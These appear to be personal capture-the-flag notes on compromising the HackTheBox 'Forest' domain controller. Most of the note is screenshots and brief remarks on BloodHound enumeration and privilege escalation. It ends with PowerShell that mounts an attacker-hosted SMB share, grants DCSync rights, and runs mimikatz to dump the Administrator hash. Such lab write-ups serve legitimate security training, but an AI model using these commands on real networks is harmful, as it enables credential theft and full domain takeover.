---
attachments: [Clipboard_2020-06-12-07-35-44.png, Clipboard_2020-06-12-07-38-13.png, Clipboard_2020-06-12-07-51-00.png, Clipboard_2020-06-12-07-51-26.png, Clipboard_2020-06-12-07-51-49.png, Clipboard_2020-06-12-07-51-58.png, Clipboard_2020-06-12-07-52-09.png, Clipboard_2020-06-12-07-52-57.png, Clipboard_2020-06-12-07-53-04.png, Clipboard_2020-06-12-07-53-17.png, Clipboard_2020-06-12-07-53-29.png, Clipboard_2020-06-12-08-01-45.png, Clipboard_2020-06-12-08-01-55.png, Clipboard_2020-06-12-08-03-10.png, Clipboard_2020-06-12-08-11-21.png, Clipboard_2020-06-12-08-16-22.png, Clipboard_2020-06-12-08-18-47.png, Clipboard_2020-06-12-08-23-28.png, Clipboard_2020-06-12-08-26-15.png, Clipboard_2020-06-12-08-27-09.png, Clipboard_2020-06-12-08-30-22.png, Clipboard_2020-06-12-08-39-18.png, Clipboard_2020-06-12-08-39-27.png, Clipboard_2020-06-12-08-39-43.png, Clipboard_2020-06-12-08-49-30.png, Clipboard_2020-06-12-08-49-39.png, Clipboard_2020-06-12-08-51-01.png, Clipboard_2020-06-12-08-58-25.png, Clipboard_2020-06-12-09-12-04.png, Clipboard_2020-06-12-09-19-23.png, Clipboard_2020-06-12-09-19-31.png, Clipboard_2020-06-12-09-19-48.png, Clipboard_2020-06-12-09-20-44.png, Clipboard_2020-06-12-09-21-25.png, Clipboard_2020-06-12-09-27-08.png, Clipboard_2020-06-12-09-27-26.png, Clipboard_2020-06-12-09-28-12.png, Clipboard_2020-06-12-09-38-47.png, Clipboard_2020-06-12-09-44-26.png, Clipboard_2020-06-12-09-44-38.png, Clipboard_2020-06-12-09-54-56.png, Clipboard_2020-06-12-09-55-17.png, Clipboard_2020-06-12-09-55-53.png, Clipboard_2020-06-12-09-56-02.png, Clipboard_2020-06-12-10-05-58.png, Clipboard_2020-06-12-10-08-17.png, Clipboard_2020-06-12-10-08-48.png, Clipboard_2020-06-12-10-14-13.png, Clipboard_2020-06-12-10-16-52.png]
tags: [HTB]
title: Forest
created: '2020-06-12T12:35:27.252Z'
modified: '2020-06-12T15:17:10.809Z'
---

# Forest

![](@attachment/Clipboard_2020-06-12-07-35-44.png)
- anon success no shares
- can confirm windows because of ttl at 127
- nslookup no work
![](@attachment/Clipboard_2020-06-12-07-38-13.png)
![](@attachment/Clipboard_2020-06-12-07-51-26.png)
![](@attachment/Clipboard_2020-06-12-07-51-49.png)
![](@attachment/Clipboard_2020-06-12-07-51-58.png)
![](@attachment/Clipboard_2020-06-12-07-52-09.png)
![](@attachment/Clipboard_2020-06-12-07-51-00.png)
![](@attachment/Clipboard_2020-06-12-07-52-57.png)
![](@attachment/Clipboard_2020-06-12-08-01-45.png)
![](@attachment/Clipboard_2020-06-12-08-01-55.png)
![](@attachment/Clipboard_2020-06-12-08-03-10.png)
![](@attachment/Clipboard_2020-06-12-08-11-21.png)
![](@attachment/Clipboard_2020-06-12-08-16-22.png)
![](@attachment/Clipboard_2020-06-12-08-18-47.png)
- example how to user query user
- same goes for other commands, use rid
![](@attachment/Clipboard_2020-06-12-08-23-28.png)
![](@attachment/Clipboard_2020-06-12-08-26-15.png)
![](@attachment/Clipboard_2020-06-12-08-27-09.png)
![](@attachment/Clipboard_2020-06-12-08-30-22.png)
![](@attachment/Clipboard_2020-06-12-08-58-25.png)
![](@attachment/Clipboard_2020-06-12-08-39-43.png)
![](@attachment/Clipboard_2020-06-12-08-39-27.png)
![](@attachment/Clipboard_2020-06-12-08-39-18.png)
![](@attachment/Clipboard_2020-06-12-08-49-30.png)
![](@attachment/Clipboard_2020-06-12-08-49-39.png)
![](@attachment/Clipboard_2020-06-12-08-51-01.png)
![](@attachment/Clipboard_2020-06-12-09-12-04.png)
- it is a domain controller so we can try using bloodhound too

![](@attachment/Clipboard_2020-06-12-09-19-48.png)
![](@attachment/Clipboard_2020-06-12-09-19-31.png)
![](@attachment/Clipboard_2020-06-12-09-20-44.png)
- password is neo4j by default, locate auth to delete password, changed to bloodhound
![](@attachment/Clipboard_2020-06-12-09-21-25.png)
![](@attachment/Clipboard_2020-06-12-09-19-23.png)
- once sharphound runs, it will drop a bloodhound zip into the share which we can put into bloodhound
![](@attachment/Clipboard_2020-06-12-09-27-08.png)
![](@attachment/Clipboard_2020-06-12-09-27-26.png)
- go to queries now
![](@attachment/Clipboard_2020-06-12-09-28-12.png)
![](@attachment/Clipboard_2020-06-12-09-38-47.png)
- could use other queries to see more
- we need to get a new user into the exchange windows permissions to that we can get to admin
- also we can create a new accound since we are under account operators
![](@attachment/Clipboard_2020-06-12-09-44-26.png)
![](@attachment/Clipboard_2020-06-12-09-44-38.png)
- in bloodhound we can look at the lines to different accounts and see the abuse info under help
- this shows us how to escalate and pivot ourselves
- we can use a tool called powerup through powersploit to do this
![](@attachment/Clipboard_2020-06-12-09-54-56.png)
![](@attachment/Clipboard_2020-06-12-09-55-17.png)
![](@attachment/Clipboard_2020-06-12-10-08-17.png)
![](@attachment/Clipboard_2020-06-12-10-08-48.png)
![](@attachment/Clipboard_2020-06-12-10-14-13.png)
![](@attachment/Clipboard_2020-06-12-10-16-52.png)
- doesn't matter what you put for the hash before colon, just syntax


- for general shell use
```
$pass = convertto-securestring 'test2' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('zonemix2', $pass)
New-PSDrive -Name zonemix2 -PSProvider FileSystem -Credential $cred -Root \\10.10.14.39\test2
```

- for after shell to upgrade
```
$pass = convertto-securestring 'PleaseSub' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\zonemix', $pass)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zonemix -Rights DCSync
lsadump::dcsync /domain:testlab.local /user:Administrator
Remove-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zonemix -Rights DCSync
```
